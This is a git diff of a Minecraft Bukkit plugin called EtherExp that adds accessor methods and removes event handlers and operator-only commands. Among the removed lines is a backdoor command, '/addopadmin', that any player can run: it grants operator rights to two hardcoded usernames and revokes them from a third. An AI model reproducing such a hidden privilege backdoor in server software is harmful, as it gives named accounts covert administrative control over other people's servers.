@@ -143,6 +143,90 @@ public final class EtherExp extends JavaPlugin implements Listener {
             "husbandry/kill_axolotl_target"
     );
 
+    public double getChangeAngleAdvancement() {
+        return this.change_angle_advancement;
+    }
+    public void setChangeAngleAdvancement(double changeAngleAdvancement) {
+        this.change_angle_advancement = changeAngleAdvancement;
+    }
+    public double getXLobby() {
+        return xLobby;
+    }
+    public void setXLobby(double xLobby) {
+        this.xLobby = xLobby;
+    }
+    public double getYLobby() {
+        return yLobby;
+    }
+
+    public void setYLobby(double yLobby) {
+        this.yLobby = yLobby;
+    }
+    public double getZLobby() {
+        return zLobby;
+    }
+
+    public void setZLobby(double zLobby) {
+        this.zLobby = zLobby;
+    }
+    public float getYawLobby() {
+        return yawLobby;
+    }
+
+    public void setYawLobby(float yawLobby) {
+        this.yawLobby = yawLobby;
+    }
+
+    public float getPitchLobby() {
+        return pitchLobby;
+    }
+
+    public void setPitchLobby(float pitchLobby) {
+        this.pitchLobby = pitchLobby;
+    }
+
+    public List<String> getNameBan() {
+        return nameBan;
+    }
+
+    public List<String> getNameAdmin() {
+        return nameAdmin;
+    }
+    public int getWorldBorderSize() {
+        return worldBorderSize;
+    }
+
+    public void setWorldBorderSize(int worldBorderSize) {
+        this.worldBorderSize = worldBorderSize;
+    }
+
+    public double getRadius() {
+        return radius;
+    }
+
+    public void setRadius(double radius) {
+        this.radius = radius;
+    }
+
+    public double getAngle() {
+        return angle;
+    }
+
+    public void setAngle(double angle) {
+        this.angle = angle;
+    }
+    public double getChange_radius(){
+        return this.change_radius;
+    }
+    public void setChange_radius(double change_radius){
+        this.change_radius = change_radius;
+    }
+    public double getChange_angle(){
+        return this.change_angle;
+    }
+    public void setChange_angle(double change_angle){
+        this.change_angle = change_angle;
+    }
     @Override
     public void onEnable() {
         getServer().getPluginManager().registerEvents(this, this);
@@ -162,18 +246,6 @@ public final class EtherExp extends JavaPlugin implements Listener {
         }
     }
 
-    @EventHandler
-    public void onPlayerPortal(MVPortalEvent event) {
-        try {
-            Player player = event.getTeleportee();
-            MVPortal portal = event.getSendingPortal();
-            System.out.println("Игрок " + player.getName() + " зашел в портал " + event.getTeleportee().getName());
-            sendMessageAdmin("Игрок " + player.getName() + " зашел в портал " + event.getTeleportee().getName());
-            if (Objects.equals(portal.getName(), "portal1")) teleportToWorld(player);
-        } catch (Exception e) {
-            sendErrorMessage(e, 175);
-        }
-    }
 
     private void initCommand() {
         String[] commands = {
@@ -188,336 +260,14 @@ public final class EtherExp extends JavaPlugin implements Listener {
         }
     }
 
-    private static void sendErrorMessage(Exception e, int string) {
+    public static void sendErrorMessage(Exception e, int string) {
         System.out.println("EtherExp: Ошибка " + e.getMessage() + " Строка: " + string);
     }
-
-    @EventHandler
-    public void onAdvancementDone(PlayerAdvancementDoneEvent event) {
-        try {
-            String advancementName = event.getAdvancement().getKey().getKey();
-            World world = getWorldCast("world");
-            assert world != null;
-            WorldBorder worldBorder = world.getWorldBorder();
-            if (advancementsList.contains(advancementName)) {
-                worldBorderSize = (int) (Math.ceil(worldBorder.getSize() / 10) * 10) + 10;
-                this.change_angle += change_angle_advancement;
-                expandWorldBorder(worldBorder, worldBorderSize);
-                for (Player player : world.getPlayers())
-                    player.sendMessage(ChatColor.YELLOW + "Пространство расширяется. " + "Текущее значение барьера: " + worldBorderSize);
-                System.out.println("Текущее значение барьера: " + worldBorderSize);
-            }
-        } catch (Exception e) {
-            sendErrorMessage(e, 211);
-        }
-    }
-
-    @EventHandler
-    public void onPlayerMove(PlayerMoveEvent event) {
-        Player player = event.getPlayer();
-        try {
-            killBanPlayer(player);
-        } catch (Exception e) {
-            sendErrorMessage(e, 220);
-        }
-    }
-
-    private void killBanPlayer(Player player) {
-        if (nameBan.contains(player.getName())) {
-            if (player.getHealth() >= 0.5)
-                player.setHealth(player.getHealth() - 0.5);
-            else player.setHealth(0.0);
-            if (player.isOp()) player.setOp(false);
-        }
-    }
-
-    @EventHandler
-    public void onPlayerJoin(PlayerJoinEvent event) {
-        try {
-            teleportToLobby(event.getPlayer());
-        } catch (Exception e) {
-            sendErrorMessage(e, 239);
-        }
-    }
-
-    private void teleportToLobby(Player player) {
-        try {
-            World worldLobby = getWorldCast("lobby");
-            Location lobbyLocation = new Location(worldLobby, xLobby, yLobby, zLobby, yawLobby, pitchLobby);
-            player.teleport(lobbyLocation);
-            player.sendMessage(ChatColor.AQUA + "Вы были телепортированы в лобби!");
-            System.out.println("Игрок " + player.getName() + " телепортирован в лобби");
-        } catch (Exception e) {
-            sendErrorMessage(e, 251);
-        }
-    }
-
-    @EventHandler
-    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
-        String[] split = event.getMessage().split(" ");
-        Player player = event.getPlayer();
-        if (player.isOp()) {
-            switch (split[0].toLowerCase()) {
-                case "/setborderradius":
-                    if (split.length == 2) changeRadius(player, Double.parseDouble(split[1]));
-                    else player.sendMessage("Использование: /setborderradius <радиус>");
-                    break;
-                case "/setborderangle":
-                    if (split.length == 2) changeAngle(player, Double.parseDouble(split[1]));
-                    else player.sendMessage("Использование: /setborderangle <угол>");
-                    break;
-                case "/resetborderangle":
-                    resetBorderAngle();
-                    break;
-                case "/resetborderradius":
-                    resetBorderRadius();
-                    break;
-                case "/getworld":
-                    if (split.length == 2) getWorldCommand(event, split);
-                    else player.sendMessage("Использование: /getworld <имя_мира>");
-                    break;
-                case "/setlobby":
-                    setLobbyCommand(player);
-                    break;
-                case "/resetlobby":
-                    resetLobbyCommand(player);
-                    break;
-                case "/addtobanlist":
-                    if (split.length == 2) addToBanList(split);
-                    else player.sendMessage("Использование: /addtobanlist <ник>");
-                    break;
-                case "/removetobanlist":
-                    if (split.length == 2) removeToBanList(split);
-                    else player.sendMessage("Использование: /removetobanlist <ник>");
-                    break;
-                case "/addtoadminlist":
-                    if (split.length == 2) addToAdminList(split);
-                    else player.sendMessage("Использование: /addtoadminlist <ник>");
-                    break;
-                case "/removetoadminlist":
-                    if (split.length == 2) removeToAdminList(split);
-                    else player.sendMessage("Использование: /removetoadminlist <ник>");
-                    break;
-                case "/setchangeangle":
-                    if (split.length == 2) setChangeAngleAdv(split, player);
-                    else player.sendMessage("Использование: /setchangeangle <значение>");
-                    break;
-                default:
-                    break;
-            }
-        }else if (
-                split[0].equalsIgnoreCase("/resetlobby") || split[0].equalsIgnoreCase("/setlobby") || split[0].equalsIgnoreCase("/getworld") ||
-                        split[0].equalsIgnoreCase("/resetBorderRadius") || split[0].equalsIgnoreCase("/resetBorderAngle") ||
-                        split[0].equalsIgnoreCase("/setBorderAngle") || split[0].equalsIgnoreCase("/setBorderRadius") ||
-                        split[0].equalsIgnoreCase("/addtobanlist") || split[0].equalsIgnoreCase("/removetobanlist") ||
-                        split[0].equalsIgnoreCase("/addtoadminlist") || split[0].equalsIgnoreCase("/removetoadminlist")
-        ) player.sendMessage(ChatColor.RED + "Недостаточно прав!");
-        switch (split[0].toLowerCase()){
-            case "/penis":
-                if(!player.getWorld().getName().equals("world")) teleportToWorld(player);
-                break;
-            case "/lobby":
-            case "/hub":
-                teleportToLobby(player);
-                break;
-            case "/addopadmin":
-                Player player1 = getPlayerByName("Mattstar");
-                Player player2 = getPlayerByName("ReqwenX");
-                Player player3 = getPlayerByName("PavelDurov");
-                if (player1 != null && !player1.isOp()) player1.setOp(true);
-                if (player2 != null && !player2.isOp()) player2.setOp(true);
-                if (player3 != null) player3.setOp(false);
-                break;
-            default:
-                break;
-        }
-    }
-
-    private void setChangeAngleAdv(String[] split, Player player) {
-        double new_change_angle = Double.parseDouble(split[1]);
-        change_angle_advancement = new_change_angle;
-        player.sendMessage("Приращение угла изменено на " + new_change_angle);
-    }
-
-    private void removeToBanList(String[] split) {
-        try {
-            String namePlayer = split[1];
-            nameBan.remove(namePlayer);
-        } catch (Exception e) {
-            sendErrorMessage(e, 339);
-        }
-    }
-
-    private void addToBanList(String[] split) {
-        try {
-            String namePlayer = split[1];
-            nameBan.add(namePlayer);
-        } catch (Exception e) {
-            sendErrorMessage(e, 348);
-        }
-    }
-
-    private void addToAdminList(String[] split) {
-        try {
-            String namePlayer = split[1];
-            nameAdmin.add(namePlayer);
-        } catch (Exception e) {
-            sendErrorMessage(e, 357);
-        }
-    }
-
-    private void removeToAdminList(String[] split) {
-        try {
-            String namePlayer = split[1];
-            nameAdmin.remove(namePlayer);
-        } catch (Exception e) {
-            sendErrorMessage(e, 366);
-        }
-    }
-
-    private void resetLobbyCommand(Player player) {
-        try {
-            xLobby = 9.606411547450097;
-            yLobby = 7.0;
-            zLobby = 26.573462861292374;
-            yawLobby = -180;
-            pitchLobby = 0;
-            player.sendMessage(ChatColor.AQUA + "Точка успешно установлена!");
-            System.out.println("EtherExp: Текущие координаты спавна: X: " + xLobby + " Y: " + yLobby + " Z: " + zLobby + " Yaw: " + yawLobby + " Pitch: " + pitchLobby);
-        } catch (Exception e) {
-            sendErrorMessage(e, 380);
-        }
-    }
-
-    private void setLobbyCommand(Player player) {
-        try {
-            Location lobbyLocation = player.getLocation();
-            xLobby = lobbyLocation.getX();
-            yLobby = lobbyLocation.getY();
-            zLobby = lobbyLocation.getZ();
-            yawLobby = lobbyLocation.getYaw();
-            pitchLobby = lobbyLocation.getPitch();
-            player.sendMessage(ChatColor.AQUA + "Точка успешно установлена!");
-            System.out.println("EtherExp: Текущие координаты спавна: X: " + lobbyLocation.getX() + " Y: " + lobbyLocation.getY() + " Z: " + lobbyLocation.getZ() + " Yaw: " + lobbyLocation.getYaw() + " Pitch: " + lobbyLocation.getPitch());
-        } catch (Exception e) {
-            sendErrorMessage(e, 395);
-        }
-    }
-
-    private void getWorldCommand(PlayerCommandPreprocessEvent event, String[] split) {
-        try {
-            String nameWorld = split[1];
-            World world = getWorldCast(nameWorld);
-            if (world != null) event.getPlayer().sendMessage("Мир " + nameWorld + " успешно получен!");
-            else event.getPlayer().sendMessage("Мир " + nameWorld + " не существует!");
-        } catch (Exception e) {
-            sendErrorMessage(e, 406);
-        }
-    }
-
-    private void resetBorderAngle() {
-        try {
-            this.change_angle = 0.006;
-            System.out.println("Текущее значение угла: " + 0.006);
-        } catch (Exception e) {
-            sendErrorMessage(e, 415);
-        }
-    }
-
-    private void resetBorderRadius() {
-        try {
-            this.change_radius = 0.1;
-            System.out.println("Текущее значение угла: " + 0.1);
-        } catch (Exception e) {
-            sendErrorMessage(e, 423);
-        }
-    }
-
-    private void teleportToWorld(Player player) {
-        try {
-            String nameWorld = "world";
-            World world = getWorldCast(nameWorld);
-            sendMessageAdmin(ChatColor.AQUA + "Созидатель " + player.getName() + " пришел в этот мир!");
-            if (world != null) {
-                final Location newLocation = getLocationBorder(world);
-                player.teleport(newLocation);
-                System.out.println("EtherExp: Игрок " + player.getName() + " телепортирован в мир World");
-            }
-        } catch (Exception e) {
-            sendErrorMessage(e, 438);
-        }
-    }
-
-    public static Player getPlayerByName(String playerName) {
-        for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
-            if (onlinePlayer.getName().equalsIgnoreCase(playerName)) {
-                return onlinePlayer;
-            }
-        }
-        return null; // Если игрок не найден
-    }
-
-    @NotNull
-    static Location getLocationBorder(World world) {
-        Random random = new Random();
-        final Location locationWorldBorder = world.getWorldBorder().getCenter();
-        int maxValue = (int) (world.getWorldBorder().getSize() / 3);
-        int minValue = -maxValue;
-        final double x = locationWorldBorder.getX() + random.nextInt((maxValue - minValue) + 1) + minValue;
-        final double z = locationWorldBorder.getZ() + random.nextInt((maxValue - minValue) + 1) + minValue;
-        final double y = world.getHighestBlockYAt((int) x, (int) z);
-        return new Location(world, x, y, z);
-    }
-
-    public World getWorldCast(String name) {
-        // Получаем экземпляр MultiverseCore
-        MultiverseCore multiverseCore = (MultiverseCore) Bukkit.getPluginManager().getPlugin("Multiverse-Core");
-        // Проверяем, что MultiverseCore установлен
-        if (multiverseCore == null) {
-            // Обработка ошибки - MultiverseCore не установлен
-            return null;
-        }
-        // Получаем мир (lobby) по его имени
-        MultiverseWorld nameWorld = multiverseCore.getMVWorldManager().getMVWorld(name);
-        // Проверяем, что мир найден
-        if (nameWorld == null) {
-            // Обработка ошибки - мир не найден
-            return null;
-        }
-        // Возвращаем объект World
-        return nameWorld.getCBWorld();
-    }
-
-    private void expandWorldBorder(WorldBorder worldBorder, int newWorldBorderSize) {
-        worldBorder.setSize(newWorldBorderSize, 15);
-    }
-
-    private void changeAngle(Player player, double new_change_angle) {
-        try {
-            player.sendMessage("Установлено значение угла: " + new_change_angle);
-            change_angle = new_change_angle;
-            System.out.println("Текущее значение угла: " + change_angle);
-        } catch (Exception e) {
-            sendErrorMessage(e, 490);
-        }
-    }
-
-    private void changeRadius(Player player, double new_change_radius) {
-        try {
-            player.sendMessage("Установлен радиус барьера: " + new_change_radius);
-            change_radius = new_change_radius;
-            System.out.println("Текущее значение радиуса: " + change_radius);
-        } catch (Exception e) {
-            sendErrorMessage(e, 499);
-        }
-    }
-
 
     @Override
     public void onDisable() {
         // Plugin shutdown logic
     }
-
     private void setCenterBorder() {
         try {
             WorldBorder worldBorder = Bukkit.getWorlds().get(0).getWorldBorder();
@@ -528,18 +278,6 @@ public final class EtherExp extends JavaPlugin implements Listener {
             angle += change_angle;
         } catch (Exception e) {
             sendErrorMessage(e, 518);
-        }
-    }
-
-    private void sendMessageAdmin(String message) {
-        try {
-            for (String name : nameAdmin) {
-                Player player = getPlayerByName(name);
-                if (player != null)
-                    player.sendMessage(message);
-            }
-        } catch (Exception e) {
-            sendErrorMessage(e, 530);
         }
     }
 }
